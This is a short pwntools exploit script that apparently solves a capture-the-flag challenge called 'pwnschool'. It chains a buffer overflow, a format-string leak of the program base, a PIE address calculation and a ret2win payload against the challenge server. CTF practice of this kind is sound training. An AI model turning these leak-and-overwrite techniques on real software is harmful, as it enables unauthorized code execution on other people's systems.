from pwn import *

#context.log_level="DEBUG"

p = remote("spaceheroes-pwnschool.chals.io", 443, ssl=True, sni="spaceheroes-pwnschool.chals.io")

# Stage1: Overflow
p.recvuntil(b">>> ")
p.sendline(b"1")            
p.recvuntil(b">>> ")
p.sendline(b"a"*(16+1))     


# Stage2: Leak 
p.recvuntil(b">>> ")
p.sendline(b"2")     
p.recvuntil(b">>> ")    
p.sendline(b"%9$p")
p.recvuntil(b" 0x1380 = ")
programBase = p.recvline()[0:-1]
programBase = programBase.decode("utf-8")
programBase = int(programBase, 0)


# Stage3: Calculate PIE Address
p.recvuntil(b">>> ")
p.sendline(b"3")
winOffset = 0x2139
winAddr = programBase + winOffset
ret = winAddr-1
p.recvuntil(b">>> ")
p.sendline(hex(winAddr).encode('utf-8'))


# Stage4: Ret2Win
p.recvuntil(b">>> ")
p.sendline(b"4")
p.recvuntil(b">>> ")
payload = (p64(ret)*40 + p64(winAddr))
p.sendline(payload)


p.interactive()